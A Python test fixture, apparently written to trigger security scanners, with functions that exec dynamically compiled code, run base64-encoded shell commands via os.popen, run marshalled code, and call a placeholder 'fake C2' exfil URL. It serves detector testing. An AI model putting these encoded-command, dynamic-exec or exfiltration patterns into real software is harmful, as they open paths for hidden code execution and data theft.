"""Payload module — TEST FIXTURE containing intentionally suspicious code.

WARNING: DO NOT EXECUTE. Designed to trigger security scanners.
"""
import marshal
import os


def execute_dynamic_code(source):
    """Trigger: compile() + exec() chain."""
    code = compile(source, "<dynamic>", "exec")
    exec(code)


def run_encoded_command(encoded_cmd):
    """Trigger: os.popen() with encoded command argument."""
    import base64
    cmd = base64.b64decode(encoded_cmd).decode("utf-8")
    result = os.popen(cmd)
    return result.read()


def load_bytecode(data):
    """Trigger: marshal.dumps/marshal.loads roundtrip for bytecode obfuscation."""
    serialized = marshal.dumps(data)
    restored = marshal.loads(serialized)
    code = compile(str(restored), "<marshalled>", "exec")
    exec(code)


def phone_home():
    """Trigger: urllib network call to fake C2 endpoint."""
    import urllib.request
    urllib.request.urlopen(
        "https://example.com/api/v1/exfil?data=test", timeout=1
    )
